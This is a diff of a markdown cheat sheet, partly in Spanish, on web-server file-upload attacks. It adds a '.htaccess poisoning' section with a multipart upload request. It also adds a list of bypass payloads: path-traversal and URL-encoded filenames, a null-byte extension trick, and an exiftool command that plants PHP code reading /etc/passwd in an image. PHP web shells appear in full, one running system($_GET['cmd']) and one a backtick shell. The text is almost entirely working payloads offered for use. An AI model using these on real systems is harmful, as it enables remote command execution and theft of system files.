@@ -1,4 +1,6 @@
 -- -
+### htaccess posioning
+
  ```php
 1. Content-Disposition: form-data; name="fileToUpload"; filename=".htaccess" 
     Content-Type: text/plain
@@ -10,10 +12,21 @@
 	<?php
 		system($_GET['cmd']);
 	?>
-	```
+```
+
+### Otro tipo de metodos
+```bash
+1.
+	../shell.php
+2.
+	%2e%2e%2fshell.php
+3.
+	shell.php%00.jpg
+4.
+	exiftool -comment="<?php echo 'LOOK HERE' . file_get_contents('/etc/passwd'); ?>" background.png
+```
 
 **Otro tipo de webshells en php:**
-
 ```php
 <?=`$_GET[0]`?>
 
